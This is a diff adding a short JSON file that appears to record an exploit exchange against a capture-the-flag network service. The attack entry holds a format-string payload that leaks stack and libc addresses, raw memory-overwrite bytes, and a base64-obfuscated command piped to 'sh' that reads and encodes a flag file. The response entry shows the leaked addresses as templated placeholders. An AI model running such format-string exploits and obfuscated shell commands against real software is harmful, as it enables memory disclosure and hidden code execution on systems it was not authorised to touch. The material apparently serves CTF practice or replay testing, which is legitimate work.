@@ -1,0 +1,5 @@
+[
+    "1Who r u?\\n", 
+    "0AAAAAAAA%5p:%6p:%7p:%8p\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00G\\x01\\xc6.y\\x7f\\x00\\x00\\necho \"Y2F0IC9mbGFncy9mYWtlLWNnaS9mbGFnIHxiYXNlNjQK\" |base64 -d |sh\\n", 
+    "1welcome!AAAAAAAA0x{{{STACK_BASE:-16736:12:HEX:18:0x7ffebecd9ea0}}}:0x{{{LIBC_BASE:3958656:12:HEX:33:0x7f2df9b61780}}}:0x{{{LIBC_BASE:1012416:12:HEX:48:0x7f2df98922c0}}}:0x7f2df9d88700HTTP/1.1 404 Not Found\\r\\nContent-Type: text/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>"
+]
